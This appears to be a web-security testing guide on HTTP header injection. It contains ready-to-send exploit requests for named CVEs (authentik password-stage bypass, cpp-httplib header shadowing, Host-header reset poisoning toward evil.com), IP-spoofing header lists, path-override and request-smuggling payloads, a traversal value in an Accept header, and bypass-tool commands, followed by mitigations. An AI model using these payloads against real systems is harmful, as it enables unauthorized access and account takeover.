# Header Injections

## Overview

Header injection vulnerabilities occur when an attacker can manipulate HTTP headers to alter server behavior, bypass security controls, poison caches, or hijack sessions. These attacks exploit the trust relationship between proxies, caches, and backend servers, as well as improper validation of user-supplied header values.

---

## Critical Headers for Testing

### IP Spoofing Headers (401/403 Bypass)

Many applications rely on headers to determine client IP addresses for access control decisions. The following headers can be injected to impersonate trusted IP addresses:

```
Client-IP: 127.0.0.1
Connection: close
Contact: 127.0.0.1
Forwarded: 127.0.0.1
Forwarded-For-Ip: 127.0.0.1
From: 127.0.0.1
Host: localhost
Origin: https://localhost
Referer: https://localhost
True-Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-Host: localhost
X-Forwarded-Server: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwared-Host: 127.0.0.1
X-Host: 127.0.0.1
X-HTTP-Host-Override: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Wap-Profile: 127.0.0.1
```

### Path Override Headers

These headers can rewrite the requested URL path, often bypassing frontend access controls while the backend processes the overridden path:

```
X-Original-URL: /admin
X-Override-URL: /admin
X-Rewrite-URL: /admin
Referer: /admin
```

### Method Override Headers

```
X-HTTP-Method-Override: PUT
X-HTTP-Method-Override: DELETE
X-Method-Override: PATCH
```

---

## Real-World Exploitation Techniques

### 1. Header Shadowing and Authentication Bypass (CVE-2025-66570)

**Affected Software:** yhirose cpp-httplib versions prior to 0.27.0

**Description:** A critical vulnerability where attacker-controlled HTTP headers (`REMOTE_ADDR`, `REMOTE_PORT`, `LOCAL_ADDR`, `LOCAL_PORT`) are processed before server-generated metadata headers with the same names. The `Request::get_header_value` method returns the first instance of a header key, giving attacker-supplied data precedence over legitimate server data.

**Exploitation Method:**
```http
GET /admin HTTP/1.1
Host: vulnerable-server.com
REMOTE_ADDR: 127.0.0.1
REMOTE_PORT: 443
```

**Impact:** IP spoofing, log poisoning, authorization bypass without authentication. CVSS Score: 10.0 (Critical)

**Fix:** Upgrade to cpp-httplib version 0.27.0 or later.

---

### 2. X-Forwarded-For Authentication Bypass (CVE-2024-47070)

**Affected Software:** authentik versions prior to 2024.6.5 and 2024.8.3

**Description:** Adding an unparsable IP address (e.g., "a") to the `X-Forwarded-For` header causes the password stage policy to skip authentication. This allows attackers to log into any account with a known login or email address without providing a password.

**Exploitation Method:**
```http
POST /api/v3/flows/executor/default-authentication-flow/ HTTP/1.1
Host: authentik.example.com
X-Forwarded-For: a
Content-Type: application/json

{"identifier": "admin@example.com"}
```

**Why It Works:** The header validation raises an exception when parsing the invalid IP address. The policy binding treats this exception as a failure, but due to misconfigured failure handling, the password stage gets skipped entirely.

**Impact:** Complete account takeover without credentials. CVSS Score: 9.0 (Critical)

**Mitigation:** 
- Upgrade to patched versions (2024.6.5 or 2024.8.3)
- Ensure reverse proxies properly overwrite `X-Forwarded-For` headers
- Configure policy binding failure options to "Pass" instead of default behavior

---

### 3. Host Header Injection for Password Reset Poisoning (CVE-2024-46452)

**Affected Software:** VigyBag Open Source Online Shop (commit 3f0e21b)

**Description:** A Host Header injection vulnerability in the password reset function allows attackers to redirect victim users to a malicious site via a crafted URL.

**Exploitation Method:**
```http
POST /password-reset HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

When the application generates password reset links using the `Host` header value, victims receive emails with links pointing to `https://evil.com/reset?token=...` instead of the legitimate domain.

**Impact:** Password reset token theft, account takeover via phishing.

**Reference:** [CVE-2024-46452](https://nvd.nist.gov/vuln/detail/CVE-2024-46452)

---

### 4. Dual Host Header Cache Poisoning

**Affected Software:** Systems with misconfigured cache logic that doesn't validate duplicate headers

**Real-World Example (PortSwigger Lab):** A vulnerability where adding a second `Host` header reflects its value in a script import URL, allowing cache poisoning.

**Exploitation Method:**
```http
GET / HTTP/1.1
Host: legit.com
Stuff: stuff
Host: evil.com
```

The frontend cache sees the first `Host` header (`legit.com`) while the backend processes the second `Host` header (`evil.com`). If the backend reflects the second header value in responses (e.g., for generating absolute URLs), the cache stores a poisoned response.

**Real Attack Scenario (Fastly - 2020):** Attackers exploited `X-Forwarded-Host` header with closed ports to poison redirect responses. The origin used the complete `X-Forwarded-Host` header information (including port number) to form redirect responses, which Fastly then cached.

**Attack Request:**
```http
GET / HTTP/1.1
Host: www.example.com:10000
```

**Resulting Cached Response:**
```http
HTTP/1.1 302 Found
Location: https://www.example.com:10000/en
X-Cache: HIT
```

Subsequent victims were redirected to a closed port, causing denial of service.

---

### 5. URL Path Override Bypass (PortSwigger Lab)

**Scenario:** Frontend access control validation with backend path override support.

**Detection Steps:**

1. Identify a request returning 403 Forbidden:
```http
GET /admin HTTP/1.1
Host: target.com
```

2. Test for path override support on accessible endpoints:
```http
GET /login HTTP/1.1
Host: target.com
X-Original-URL: /my-account
```

If the response matches `/my-account` instead of `/login`, the header is supported.

3. Exploit the misconfiguration:
```http
GET /login HTTP/1.1
Host: target.com
X-Original-URL: /admin
```

The frontend validates `/login` (accessible) but the backend processes `/admin` (restricted).

**Why It Works:** Access control is enforced at the frontend proxy layer instead of the backend server. Frontend validates the visible path (`/login`), then forwards the request with the rewritten path to the backend, which serves the admin panel without revalidating authorization.

---

### 6. HTTP Request Smuggling via Header Inconsistencies

HTTP request smuggling occurs when frontend and backend servers disagree on where one request ends and another begins.

#### CL.TE (Content-Length vs. Transfer-Encoding)

**Detection Request:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0

x
```

The frontend reads 6 bytes (`0\r\n\r\nx`) and forwards. The backend sees `Transfer-Encoding: chunked` and waits for `0\r\n\r\n`, leaving `x` to be smuggled into the next request.

#### TE.CL (Transfer-Encoding vs. Content-Length)

**Detection Request:**
```http
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 3

1
x
0

```

The frontend processes the chunked encoding, forwarding the full body. The backend reads only 3 bytes (`1\r\nx`), leaving the rest to be concatenated to the next request.

#### Header Trailer Injection (CVE-2026-32881)

**Affected Software:** ewe versions prior to 3.0.5

**Description:** Chunked transfer encoding trailer handling merges declared trailer fields into request headers after body parsing. The denylist only blocks 9 header names, allowing injection of security-sensitive headers like `authorization`, `cookie`, and `x-forwarded-for`.

**Exploitation Method:**
```http
POST / HTTP/1.1
Host: localhost:8080
Transfer-Encoding: chunked
Trailer: x-forwarded-for

4
test
0
x-forwarded-for: 10.0.0.1

```

**Impact:** Authentication bypass via token injection, IP spoofing, session fixation.

---

### 7. HTTP Version Manipulation

Changing the HTTP version can cause unexpected behavior in legacy systems.

**Technique:**
```http
GET /admin HTTP/0.9
Host: evil.com
```

HTTP/0.9 doesn't require a Host header. Some servers accept HTTP/0.9 requests but process them differently than HTTP/1.1 requests, potentially bypassing virtual host routing and accessing internal endpoints.

---

## Automated Testing Tools

### byp4xx
```bash
# https://github.com/lobuhi/byp4xx
./byp4xx.sh https://target.com/admin
```

Tests various header injection payloads to bypass 401/403 restrictions.

### headi
```bash
# https://github.com/mlcsec/headi
headi -url http://target.com/admin -headers x-forwarded-for,true-client-ip
```

Automated header injection testing with custom header lists.

### skip403
```bash
# https://github.com/geisonn/skip403
skip403 -u https://target.com/admin
```

Smart header and path manipulation for bypassing access controls.

### Wordlists
- [SecLists - lowercase-headers](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers)
- [SecLists - HTTP Request Headers](https://github.com/danielmiessler/SecLists/tree/bbb4d86ec1e234b5d3cfa0a4ab3e20c9d5006405/Miscellaneous/web/http-request-headers)

---

## Advanced Testing Techniques

### Content-Type Manipulation
```
Accept: application/json, text/javascript, */*; q=0.01
Accept: ../../../../../../../../../etc/passwd{{
```

### Line Wrapping
```http
GET /index.php HTTP/1.1
 Host: vulnerable-website.com
Host: evil-website.com
```

Some servers interpret wrapped lines differently, allowing header injection without direct validation.

### Absolute URL in GET Request
```http
GET https://vulnerable-website.com/ HTTP/1.1
Host: evil-website.com
```

If the server processes the absolute URL instead of the Host header, access controls may be bypassed.

---

## Mitigation Recommendations

1. **Never trust client-supplied headers** for security decisions. Use trusted proxies to set and override headers like `X-Forwarded-For`.

2. **Implement strict header validation** for all incoming headers. Reject requests with duplicate or malformed headers.

3. **Use allowlists for header values** where possible (e.g., specific IP formats, known domains).

4. **Enforce access control at the backend**, not at reverse proxies or load balancers.

5. **Configure cache keys** to include all headers that affect responses to prevent cache poisoning.

6. **Remove unsupported headers** during HTTP/2 to HTTP/1.1 downgrades to prevent smuggling.

7. **Update affected libraries** when CVEs are disclosed (cpp-httplib, authentik, ewe, etc.).

8. **Monitor logs** for anomalous header values, duplicate headers, or malformed IP addresses.
